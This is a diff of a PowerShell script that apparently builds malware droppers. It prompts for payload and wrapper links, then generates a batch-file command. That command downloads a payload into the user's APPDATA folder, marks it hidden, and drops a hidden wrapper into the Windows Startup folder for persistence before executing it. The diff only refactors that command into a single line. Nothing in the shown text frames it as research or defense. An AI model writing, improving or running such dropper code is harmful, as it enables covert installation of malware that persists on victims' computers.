@@ -649,11 +649,7 @@ function Init-Script {
     $payloadPath = Read-Host "Payload path"
     $wrapperName = Read-Host "Wrapper name"
 
-    $psCommand = "iwr '$payloadLink' -OutFile (Join-Path `$env:APPDATA '$payloadPath');" +
-        "attrib +h (Join-Path `$env:APPDATA '$payloadPath');" +
-        "iwr '$wrapperLink' -OutFile (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName');" +
-        "attrib +h (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName');" +
-        "& (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName')"
+    $psCommand = "`$startup=[Environment]::GetFolderPath('Startup'); `$appdata=[Environment]::GetFolderPath('ApplicationData'); iwr '$payloadLink' -OutFile (Join-Path `$appdata '$payloadPath'); attrib +h (Join-Path `$appdata '$payloadPath'); iwr '$wrapperLink' -OutFile (Join-Path `$startup '$wrapperName'); attrib +h (Join-Path `$startup '$wrapperName'); & (Join-Path `$startup '$wrapperName'); exit"
 
     $batchContent = "powershell -NoProfile -Command `"$psCommand`""
 
@@ -957,4 +953,5 @@ while (-not $exitRequested) {
     }
 
 }
+
 
